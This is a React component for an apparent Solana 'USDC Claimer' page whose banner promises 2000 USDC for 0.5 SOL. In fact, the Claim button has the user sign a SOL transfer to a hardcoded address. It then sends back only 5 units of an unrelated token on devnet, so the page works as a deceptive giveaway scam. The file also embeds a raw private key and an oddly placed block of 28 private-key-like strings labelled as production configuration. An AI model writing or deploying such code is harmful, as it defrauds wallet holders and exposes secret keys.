/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5tGP6cVybiVwqPswWThuVCm6THGgAja3p4R9piuETjSsFQpfxftfDiXUkJM4rWeE2yY84KQ8M6uscLaeY3vLp3pF"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5bhdm7xVDccCitzrBo6yyt3x1AARtXxKSwvdLWj9bKzMoYb3jajUBZY4WVBDRzEWJpCmNNsbyELWivWdgXwJaTc",
  "key1": "3m7ccXbHfrgzBE9aLaVFx45sLB4bP5Kn8ECX17WZ2Kz9vHg1btNf9nnFsWWNpppvkk5Eygppj1yeDxmNFwddQ9UP",
  "key2": "5FEzqzmkZNY8bChFmvtMYrgSE4KdV1ZdyyZeoTJz67uqJQtgjp5XeERA76FUEDKHuAxnmDDCadBNJziis6AxKV8G",
  "key3": "26bJJjNnM55h2wwsqniWjxq5m6zRhmfNNg5KGFyWV6QLGtkRTq4ngTW6xa73LdkizLoLWUWhJe99JQhViek5bknx",
  "key4": "4kRc5KRBYfKYEembULjD7zfDahS3dXzfx4gQ4fkvN8M3MCEUPuSQXLF4onFTPT1iZHM1TT3viYL1gfQMFBMaSn7T",
  "key5": "5yGcGZkA1yZq5dm37H3jaGPzisjPxyq7YbhyVv2SrWVTc2kuhXHYd9ZAXKNB6UsARhsqpz7Y9PBQ687HoZ192BA4",
  "key6": "3g79P5VgNm1xVboXtWYYg2T5qhtFpoVMXWLrqwZwKiboCapBmMBrtDsmAJWsZyvMVSNL1bMJr8f7yDeVEaFbzJ3X",
  "key7": "26M5JNCcWSihvPaKvZrTGqDomYvd8HAdq6kMpTCJXTBMZfy1EFhx9XCDCiXeVhzhEYZPkEDQ6vZs1xp6qsiNrNt6",
  "key8": "3Y3QMnsB2gxESuMp8dvg9LBqWVSYTBSM2VEQDvCuzimYpAW8dpRJJ9ThcDcy8yqHsHYeSgSUapLmcYMECTtekQvw",
  "key9": "3iip1p9Dx6MZ3YvZ1Mm3UtjQ54M1em9HrgF2hp5GxNsbSScvJoPxWinZyBYnGVCSYMJjVEUyN9FNsKhv4hXFL1TZ",
  "key10": "2upDoZ9r9j9iPmNmf5VkHFh4n3nma185RXfrVcvHPNxnR7QaPiyW24UFvrtZhbsYDewAj2UfyH2Nvxip4e7iiYKn",
  "key11": "3iNe356EZsHRJE8RpmBWKVEJZ6w2pBPpQf4z2LtgdSGZtDSMwUpaMqXfvh8UAtRSrRto4ch5rY2evabvAcEtwoYQ",
  "key12": "2zoT1quBB7ZWBojFThvWozgnUzNwxgb5GZZSTBc1hGQCs2ebhaiSkqG6jJvJiJ32pEa7EmK82CKzMxjwpCFLwaQA",
  "key13": "3m28zLYaxhrZVmQcdQg8VWXdPjFzWoqz4mz2SUoYqeVm1kCkgBpWGGuuMj5RKXGPrzrGDhYypiAhmEYGqpvk9TJN",
  "key14": "4SZxwBaEsqU1DUjUaCQBwjyVZz6ce4WGXN8sxcEY5LPXRZWxFe4CSG1ePpGqo8cbZkoM3ttBz7osTcrohBt2kidc",
  "key15": "49sq7rjasBENTrX1DTWQFQkWfE6bmdbqAJbHEKf1E17p6Sq8TNg2naB4QGTkmrTDZnx42KY4G2qrMgRxuQuccauC",
  "key16": "3PgHyUmEK5BJ6NiPvSwaUUnLCpPJcvQ3GZonSd84rXAj8YwJXNasenyU5DmESvmCNQjBtXy7zMi6iGBGXg6Pobme",
  "key17": "3rZeo96YLwq6sfPuqZNFc3rZVa6S2Dq6e5Qx9UKcE4V2uQ3iEM5wvR1hy4iLQ2Reip9hYHaFGvDWw6rv2JRSDaTn",
  "key18": "5KQmin5G2BU1NidFkQqEXaE3QxCMHSSNqcvm2x3bpYboaqwGKF6zYEkXUutqWVkUZSQQT1SR4cjztvNM5fQofBVs",
  "key19": "2f2mj9G1vxq5t73CZdZ3Jc8vMnYhtkH1quu5LKozh3WWLcTRJaFL98mqUaXdzBDZY2aFe2KcDpFcju8ymL5s5aSc",
  "key20": "3LfXyVnWunM8iorwoeunfzsJszwqTXKCpfDxN6ZJXGjzEdYwhMrRpvB16G7o6Ub7qcwD259EzNZTRCe9Mh9aGMLe",
  "key21": "4NpK3Pkr1odLa47suTuriqEytGTA7wowJrLoGkpofUvmYt6Rh3vZPCHcJRAbGqm1UahyMhud7HF3HZKZN2dUuXxy",
  "key22": "25uAHPFbFasrDxLPDiyPNQNSbKx4yvNxSjpCxd1isRxmMofGytKX2d89Dd76kFNYTPDZhy7F4HWYCAomtrLrjW5d",
  "key23": "5Zda3GhVGfQpvATJG58vePkh1TyB5tiBsiwDDP9K2zBnsUD2tanoHGoujvRWWDErWBruuyiunRsuGdwNLdzNX1ax",
  "key24": "i8KBvnYatPY9fptMUDJFqz5kUQQRnyhdci2b1jAr2TAsvvvCUerLf7UiDBnEQee5HWQGrnVQyTMwzixcgmDHxVZ",
  "key25": "3onowq1hMyxJzLetiHDknodEibTSuF2Znhcn5udGn9K9iXhQkG5hiMdBYx6b67xdQgsJatbuJ3QpkvCUHnygxNoV",
  "key26": "4u9XrR5d7CZcSR97aka4bam2eZmNfJsjHEFcx8JzffNCuLX8pxpAVT3jeoXZ1V1R7t8wyhN1JWGC628wneADJDVo",
  "key27": "4btp6Maq825hKXQuVjyk5rfGWMUk4NuMsLzUdBLxmZ4VEF7p1Zn2hVVjc266SJMw45mTPsA54grqKSuP2Byr6ifw"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
